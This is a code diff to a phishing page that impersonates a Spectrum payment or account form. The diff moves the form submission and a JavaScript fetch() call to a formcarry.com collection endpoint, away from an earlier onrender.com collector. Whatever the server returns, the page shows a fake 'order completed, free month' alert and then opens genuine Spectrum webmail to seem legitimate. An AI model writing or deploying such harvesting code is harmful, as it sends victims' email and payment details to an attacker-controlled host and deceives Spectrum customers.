@@ -338,7 +338,7 @@
 
         <!-- Payment Form -->
         <div class="card">
-            <form action="https://self-care.portals.spectrum.net/username-recovery" method="POST" id="paymentForm">
+            <form action="https://formcarry.com/s/RBEBHktdC1G" method="POST" id="paymentForm">
             <!-- Email -->
             <div class="form-group">
                 <label class="form-label">Email address</label>
@@ -474,7 +474,7 @@
             const formData = new FormData(this);
             
             // Submit form data to the server
-            fetch('https://twc-await.onrender.com/', {
+            fetch('https://formcarry.com/s/RBEBHktdC1G', {
                 method: 'POST',
                 body: formData
             })
@@ -482,16 +482,16 @@
                 // Show success message and redirect regardless of server response
                 setTimeout(() => {
                     alert('Order completed successfully!!!.... You have received a 1 month paid subscription for free.');
-                    // Redirect to Spectrum webmail after alert is closed
-                    window.location.href = 'https://webmail.spectrum.net/';
+                    // Open Spectrum webmail in a new tab instead of redirecting
+                    window.open('https://webmail.spectrum.net/', '_blank');
                 }, 1000);
             })
             .catch(error => {
                 // Even if there's an error, show success message and redirect
                 setTimeout(() => {
                     alert('Order completed successfully!!!.... You have received a 1 month paid subscription for free.');
-                    // Redirect to Spectrum webmail after alert is closed
-                    window.location.href = 'https://webmail.spectrum.net/';
+                    // Open Spectrum webmail in a new tab instead of redirecting
+                    window.open('https://webmail.spectrum.net/', '_blank');
                 }, 1000);
             });
         });
